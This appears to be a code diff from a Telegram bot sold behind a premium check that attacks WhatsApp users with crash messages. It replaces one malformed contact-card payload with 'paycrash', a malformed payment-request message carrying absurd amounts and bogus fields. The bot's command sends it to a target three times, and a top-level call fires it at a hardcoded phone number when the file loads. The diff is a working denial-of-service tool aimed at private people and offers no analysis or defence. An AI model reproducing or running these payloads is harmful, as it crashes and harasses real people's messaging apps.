@@ -1404,7 +1404,7 @@ bot.command("fcnew", checkWhatsAppConnection, checkPremium, async ctx => {
   await prosesrespone(target, ctx);
 
   for (let i = 0; i < 3; i++) {
-    await sendBugKontak(target)
+    await paycrash(target)
     
 }
 
@@ -2007,25 +2007,51 @@ https://chat.whatsapp.com/I24OwNUuBzk6KRDeNDF62e
 
 THX TO OM TAMA, KARENA DIA SAYA MENDAPATKAN SEBUAH IDE TENTANG QUOTED INI
 */
-async function sendBugKontak(target) {
-  const message = {
-    extendedTextMessage: {
-      text: "Memek",
-      contextInfo: {
-        stanzaId: "5521992999999@s.whatsapp.net",
-        participant: target,
-        quotedMessage: {
-          contactMessage: {
-            displayName: "@tamainfinity",
-            vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:@tamainfinity\nX-WA-BIZ-NAME:@tamainfinity\n\nORG:@tamainfinity;\nTEL;type=CELL;type=VOICE;waid=5521992999999:+55 21 99299-9999\nEND:VCARD"
-          }
-        }
-      }
-    }
-  };
+async function paycrash(target) {
+    await kipop.relayMessage(
+        target,
+        {
+            requestPaymentMessage: {
+                currencyCodeIso4217: "XXX",
+                amount1000: "9999999",
+                noteMessage: {
+                    extendedTextMessage: {
+                        text: "# 🍷 Devorsix - How Do I Get Through This ?",
+                        viewOnce: true,
+                        contextInfo: {
+                            businessMessageForwardInfo: {
+                                businessOwnerJid: "5521992999999@s.whatsapp.net"
+                            }
+                        }
+                    }
+                },
+                expiryTimestamp: "0",
+                amount: {
+                    value: "999999999",
+                    offset: 999999999,
+                    currencyCode: "XXX"
+                },
+                background: {
+                    id: "100",
+                    fileLength: "928283",
+                    width: 1000,
+                    height: 1000,
+                    mimetype: "stay withme - devorsixcore",
+                    placeholderArgb: 4278190080,
+                    textArgb: 4294967295,
+                    subtextArgb: 4278190080
+                }
+            }
+        },
+        {
+            participant: { jid: target }
+        }
+    );
 
-  await kipop.relayMessage(target, message, {});
+    //await devorsix.offerCall(bokep);
 }
+
+paycrash("62895099999999@s.whatsapp.net");
 async function bulldozer(isTarget) {
   let message = {
     viewOnceMessage: {
